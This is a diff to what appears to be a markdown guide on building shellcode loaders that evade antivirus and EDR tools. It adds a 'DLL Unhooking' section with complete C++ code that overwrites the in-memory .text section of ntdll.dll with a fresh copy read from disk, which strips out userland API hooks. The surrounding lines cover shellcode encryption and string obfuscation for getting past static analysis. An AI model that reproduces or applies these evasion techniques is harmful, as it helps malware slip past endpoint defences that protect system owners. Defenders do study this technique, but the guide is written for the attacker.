@@ -9,6 +9,7 @@ Below I will outline several ways to write a shellcode loader in memory and how 
 5. [Сhecking mutex before launching](#5)
 6. [Allocating a large amount of memory for shellcode](#6)
 7. [Obfuscate strings](#7)
+8. [DLL Unhooking](#8)
 
 ## <a name="1">Shellcode encryption </a>
 The simplest and most important way to hide the load is shellcode encryption , this will help bypass static analysis of your file.
@@ -117,3 +118,50 @@ for example:
 When plain text string literals are used in C++ programs, they will be compiled as-is into the resultant binary. This causes them to be incredibly easy to find. One can simply open up the binary file in a text editor to see all of the embedded string literals in plain view. A special utility called strings exists which can be used to search binary files for plain text strings.
 
 You can use special strings obfuscators for example https://github.com/adamyaxley/Obfuscate
+
+## <a name="8">DLL Unhooking</a>
+
+It's possible to completely unhook any given DLL loaded in memory, by reading the .text section of ntdll.dll from disk and putting it on top of the .text section of the ntdll.dll that is mapped in memory. This may help in evading some EDR solutions that rely on userland API hooking.
+
+for example:
+```
+#include "pch.h"
+#include <iostream>
+#include <Windows.h>
+#include <winternl.h>
+#include <psapi.h>
+
+int main()
+{
+	HANDLE process = GetCurrentProcess();
+	MODULEINFO mi = {};
+	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
+	
+	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
+	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
+
+	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
+	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
+
+	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
+		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+		
+		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
+			DWORD oldProtection = 0;
+			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
+		}
+	}
+	
+	CloseHandle(process);
+	CloseHandle(ntdllFile);
+	CloseHandle(ntdllMapping);
+	FreeLibrary(ntdllModule);
+	
+	return 0;
+}
+```
